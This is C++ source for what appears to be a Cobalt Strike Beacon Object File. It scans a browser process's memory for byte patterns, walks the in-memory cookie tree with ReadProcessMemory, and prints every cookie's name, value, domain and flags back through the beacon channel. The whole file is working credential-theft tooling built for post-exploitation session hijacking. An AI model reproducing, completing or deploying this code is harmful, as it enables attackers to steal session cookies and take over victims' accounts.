
extern "C" {
#include <cstdint>
#include "..\DFR.h"
#include "../beacon.h"

    struct OptimizedString {
        char buf[23];
        UCHAR len;
    };

    struct RemoteString {
        uintptr_t dataAddress;
        size_t strLen; //This won't include the null terminator
        int strMax; //Maximum string length
        char unk[3]; //I just couldn't figure out the last data type :(
        UCHAR strAlloc; //Seems to always be 0x80, honestly no idea what it should mean
    };

    struct CanonicalCookie {
        OptimizedString name;
        OptimizedString value;
        OptimizedString domain;
        OptimizedString path;
        int64_t creation_date;
        int64_t expiry_date;
        int64_t last_access_date;
        int64_t last_update_date;
        bool secure;
        bool httponly;
    };

    struct Node {
        uintptr_t left;
        uintptr_t right;
        uintptr_t parent;
        bool is_black; //My guess is that data is stored in red-black tree
        char padding[7];
        OptimizedString key;
        uintptr_t valueAddress;
    };

    struct RootNode {
        uintptr_t beginNode;
        uintptr_t firstNode;
        size_t size;
    };

    void ReadString(HANDLE hProcess, OptimizedString string) {

        if (string.len > 23) //This is the max size of Short String Optimization (To my knowledge)
        {
            RemoteString longString = { 0 };
            memcpy(&longString, &string.buf, sizeof(RemoteString));

            if (longString.dataAddress != 0) {
#ifdef _DEBUG
                BeaconPrintf(CALLBACK_OUTPUT, "Attempting to read the cookie value from address: 0x%p\n", (void*)longString.dataAddress);
#endif
                unsigned char* buf = (unsigned char*)malloc(longString.strMax);
                if (buf == 0 || !ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(longString.dataAddress), buf, longString.strLen + 1, nullptr)) {
                    BeaconPrintf(CALLBACK_ERROR, "Failed to read cookie value! Error: %i\n", GetLastError());
                    free(buf);
                    return;
                }
                BeaconPrintf(CALLBACK_OUTPUT, "%s\n", buf);
                free(buf);
            }
        }
        else
            BeaconPrintf(CALLBACK_OUTPUT, "%s\n", string.buf);

    }

    void PrintTimeStamp(int64_t timeStamp) {
        ULONGLONG fileTimeTicks = timeStamp * 10;

        FILETIME fileTime;
        fileTime.dwLowDateTime = static_cast<DWORD>(fileTimeTicks & 0xFFFFFFFF);
        fileTime.dwHighDateTime = static_cast<DWORD>(fileTimeTicks >> 32);

        SYSTEMTIME systemTime;
        FileTimeToSystemTime(&fileTime, &systemTime);

        BeaconPrintf(CALLBACK_OUTPUT, "%04hu-%02hu-%02hu %02hu:%02hu:%02hu\n",
            systemTime.wYear, systemTime.wDay, systemTime.wMonth,
            systemTime.wHour, systemTime.wMinute, systemTime.wSecond);
    }

    void ProcessNodeValue(HANDLE hProcess, uintptr_t Valueaddr) {

        CanonicalCookie cookie = { 0 };
        if (!ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(Valueaddr), &cookie, sizeof(CanonicalCookie), nullptr)) {
            BeaconPrintf(CALLBACK_ERROR, "Failed to read cookie struct! Error: %i\n", GetLastError());
        }

        BeaconPrintf(CALLBACK_OUTPUT, "    Name: ");
        ReadString(hProcess, cookie.name);
        BeaconPrintf(CALLBACK_OUTPUT, "    Value: ");
        ReadString(hProcess, cookie.value);
        BeaconPrintf(CALLBACK_OUTPUT, "    Domain: ");
        ReadString(hProcess, cookie.domain);
        BeaconPrintf(CALLBACK_OUTPUT, "    Path: ");
        ReadString(hProcess, cookie.path);
        BeaconPrintf(CALLBACK_OUTPUT, "    Creation time: ");
        PrintTimeStamp(cookie.creation_date);
        BeaconPrintf(CALLBACK_OUTPUT, "    Expiration time: ");
        PrintTimeStamp(cookie.expiry_date);
        BeaconPrintf(CALLBACK_OUTPUT, "    Last accessed: ");
        PrintTimeStamp(cookie.last_access_date);
        BeaconPrintf(CALLBACK_OUTPUT, "    Last updated: ");
        PrintTimeStamp(cookie.last_update_date);
        BeaconPrintf(CALLBACK_OUTPUT, "    Secure: %s\n", cookie.secure ? "True" : "False");
        BeaconPrintf(CALLBACK_OUTPUT, "    HttpOnly: %s\n", cookie.httponly ? "True" : "False");

        BeaconPrintf(CALLBACK_OUTPUT, "\n");
    }

    void ProcessNode(HANDLE hProcess, const Node& node) {
        BeaconPrintf(CALLBACK_OUTPUT, "Cookie Key: ");
        ReadString(hProcess, node.key);

#ifdef _DEBUG
        BeaconPrintf(CALLBACK_OUTPUT, "Attempting to read cookie values from address:  0x%p\n", (void*)node.valueAddress);
#endif
        ProcessNodeValue(hProcess, node.valueAddress);

        //Process the left child if it exists
        if (node.left != 0) {
            Node leftNode;
            if (ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(node.left), &leftNode, sizeof(Node), nullptr))
                ProcessNode(hProcess, leftNode);
            else
                BeaconPrintf(CALLBACK_ERROR, "Error reading left node! Error: %i\n", GetLastError());
        }

        //Process the right child if it exists
        if (node.right != 0) {
            Node rightNode;
            if (ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(node.right), &rightNode, sizeof(Node), nullptr))
                ProcessNode(hProcess, rightNode);
            else
                BeaconPrintf(CALLBACK_ERROR, "Error reading right node! Error: %i\n", GetLastError());
        }
    }

    void WalkCookieMap(HANDLE hProcess, uintptr_t cookieMapAddress) {

        RootNode cookieMap;
        if (!ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(cookieMapAddress), &cookieMap, sizeof(RootNode), nullptr)) {
            BeaconPrintf(CALLBACK_ERROR, "Failed to read the root node from given address! Error: %i\n", GetLastError());
            return;
        }

        // Process the root node
#ifdef _DEBUG
        BeaconPrintf(CALLBACK_OUTPUT, "Address of beginNode: 0x%p\n", (void*)cookieMap.beginNode);
        BeaconPrintf(CALLBACK_OUTPUT, "Address of firstNode: 0x%p\n", (void*)cookieMap.firstNode);
        BeaconPrintf(CALLBACK_OUTPUT, "Size of the cookie map: %zu\n", cookieMap.size);
#endif

        BeaconPrintf(CALLBACK_OUTPUT, "[*] Number of available cookies: %zu\n\n", cookieMap.size);
        // Process the first node of the binary search tree
        Node firstNode;
        if (ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(cookieMap.firstNode), &firstNode, sizeof(Node), nullptr)) {
            BeaconPrintf(CALLBACK_OUTPUT, "Starting first node\n");
            ProcessNode(hProcess, firstNode);
        }
        else {
            BeaconPrintf(CALLBACK_ERROR, "Error reading first node! Error: %i\n", GetLastError());
        }
    }

    BOOL FindPattern(HANDLE hProcess, const BYTE* pattern, size_t patternSize, uintptr_t& resultAddress) {

        SYSTEM_INFO systemInfo;
        GetSystemInfo(&systemInfo);

        uintptr_t startAddress = reinterpret_cast<uintptr_t>(systemInfo.lpMinimumApplicationAddress);
        uintptr_t endAddress = reinterpret_cast<uintptr_t>(systemInfo.lpMaximumApplicationAddress);

        MEMORY_BASIC_INFORMATION memoryInfo;

        int hitcount = 0;
        while (startAddress < endAddress) {
            if (VirtualQueryEx(hProcess, reinterpret_cast<LPCVOID>(startAddress), &memoryInfo, sizeof(memoryInfo)) == sizeof(memoryInfo)) {
                if (memoryInfo.State == MEM_COMMIT && (memoryInfo.Protect & (PAGE_READWRITE | PAGE_EXECUTE_READWRITE)) != 0) {
                    BYTE* buffer = (BYTE*)malloc(memoryInfo.RegionSize);
                    SIZE_T bytesRead;

                    if (ReadProcessMemory(hProcess, memoryInfo.BaseAddress, buffer, memoryInfo.RegionSize, &bytesRead)) {
                        for (size_t i = 0; i <= bytesRead - patternSize; ++i) {
                            if (memcmp(buffer + i, pattern, patternSize) == 0) {
                                if (hitcount > 0)
                                {
                                    resultAddress = reinterpret_cast<uintptr_t>(memoryInfo.BaseAddress) + i;
                                    uintptr_t offset = resultAddress - reinterpret_cast<uintptr_t>(memoryInfo.BaseAddress);
#ifdef _DEBUG
                                    BeaconPrintf(CALLBACK_OUTPUT, "Found pattern on AllocationBase: 0x%p, BaseAddress: 0x%p, Offset: 0x%Ix\n",
                                        memoryInfo.AllocationBase,
                                        memoryInfo.BaseAddress,
                                        offset);
#endif
                                    free(buffer);
                                    return TRUE;
                                }
                                hitcount++;
                            }
                        }
                    }
                    else {
                        //This happens quite a lot, will not print these errors on release build
#ifdef _DEBUG
                        BeaconPrintf(CALLBACK_ERROR, "ReadProcessMemory failed! Error: %i\n", GetLastError());
#endif
                    }

                    free(buffer);
                }

                startAddress += memoryInfo.RegionSize;
            }
            else {
                BeaconPrintf(CALLBACK_ERROR, "VirtualQueryEx failed! Error: %i\n", GetLastError());
                break;
            }
        }

        return FALSE;
    }

    //This is here to allow wildcard matching
    BOOL MyMemCmp(BYTE* source, const BYTE* searchPattern, size_t num) {

        for (size_t i = 0; i < num; ++i) {
            if (searchPattern[i] == 0xAA)
                continue;
            if (source[i] != searchPattern[i]) {
                return FALSE;
            }
        }

        return TRUE;
    }

    BOOL FindDllPattern(HANDLE hProcess, const BYTE* pattern, size_t patternSize, uintptr_t moduleAddr, DWORD moduleSize, uintptr_t& resultAddress)
    {
        BYTE* buffer = (BYTE*)malloc(moduleSize);
        SIZE_T bytesRead;

        BOOL result = ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(moduleAddr), buffer, moduleSize, &bytesRead);
        DWORD error = GetLastError();

        if (result || error == 299) { //It is fine if not all was read
            for (size_t i = 0; i <= bytesRead - patternSize; ++i) {
                if (MyMemCmp(buffer + i, pattern, patternSize)) {
                    resultAddress = moduleAddr + i;
                    free(buffer);
                    return TRUE;
                }
            }
        }
        else {
            //This happens quite a lot, will not print these errors on release build
#ifdef _DEBUG
            BeaconPrintf(CALLBACK_ERROR, "ReadProcessMemory failed! Error: %i\n", GetLastError());
#endif
        }
        free(buffer);
        return FALSE;
    }
}